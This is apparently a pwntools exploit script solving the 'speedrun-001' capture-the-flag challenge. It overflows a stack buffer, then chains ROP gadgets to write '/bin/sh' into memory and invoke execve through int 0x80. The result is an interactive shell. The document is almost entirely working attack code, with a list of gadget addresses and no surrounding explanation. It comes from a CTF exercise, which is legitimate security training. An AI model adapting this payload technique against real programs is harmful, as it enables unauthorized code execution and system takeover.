from pwn import *

host = 'speedrun-001.quals2019.oooverflow.io'
port = '31337'

conn = process('./speedrun-001')

""" Usefull Gadgets:

0x000000000046817a : int 0x80

0x47f471 mov qword ptr [rsi], rax ; ret
0x000000000041dcd0 : mov rax, rsi ; ret
0x0000000000444240 : mov rcx, qword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x0000000000422e05 : lea rcx, [rdx - 8] ; cmovne rax, rcx ; ret

0x0000000000415664 : pop rax ; ret
0x0000000000400df8 : pop rbx ; ret
0x00000000004498b5 : pop rdx ; ret
0x00000000004101f3 : pop rsi ; ret


empty_location 1 (used to set rcx to zero value) = 00000000006BA358
Free space for /bin/sh                             0x6BA34D

"""

payload = 'a' * 1032

pop_rax = p64(0x415664)
pop_rbx = p64(0x400df8)
pop_rdx = p64(0x4498b5)
pop_rsi = p64(0x4101f3)

write_gadget = p64(0x47f471)			# mov qword ptr [rsi], rax ; ret

# Copy /bin/sh
bin_sh_text = p64(0x0068732f6e69622f)	# /bin/sh
bin_sh_addr = p64(0x6BA34D)
payload += pop_rax + bin_sh_text + pop_rsi + bin_sh_addr + write_gadget

# Set rbx the address of /bin/sh
payload += pop_rbx + bin_sh_addr 

# 0x0000000000422e05 : lea rcx, [rdx - 8] ; cmovne rax, rcx ; ret
payload += pop_rsi + p64(0x6BA358 + 8) + p64(0x422e05)

# Reset rdx
payload += pop_rdx + p64(0)

# set 11 in rax
payload += pop_rax + p64(0xb) 

# Call int 0x80
payload += p64(0x46817a)

conn.send(payload)

conn.interactive()

